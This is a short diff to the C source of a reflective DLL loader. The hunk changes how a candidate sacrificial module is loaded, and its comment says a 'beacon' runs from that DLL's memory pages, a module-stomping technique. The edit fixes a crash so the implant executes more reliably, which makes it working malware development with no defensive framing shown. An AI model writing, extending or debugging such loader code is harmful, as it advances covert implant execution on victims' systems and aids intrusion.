@@ -520,7 +520,14 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         }
         wname[27] = 0;
 
-        h = pLLW(wname, NULL, DONT_RESOLVE_DLL_REFERENCES);
+        /* 2026-10-26: DONT_RESOLVE_DLL_REFERENCES is documented as unsafe
+         * ("the system may unload the module") - live cdb debugging caught
+         * spwizimg being ZwUnmapViewOfSection'd mid-run while the beacon
+         * executed from its pages (llvm branch appendix C/D). The primary
+         * candidate has no entry point and no imports, and the fallbacks
+         * are benign, so a fully-resolved, properly-referenced mapping
+         * costs nothing and can never be spuriously unloaded. */
+        h = pLLW(wname, NULL, 0);
         if (h == NULL)
             continue;
         cand = (unsigned char *)h;
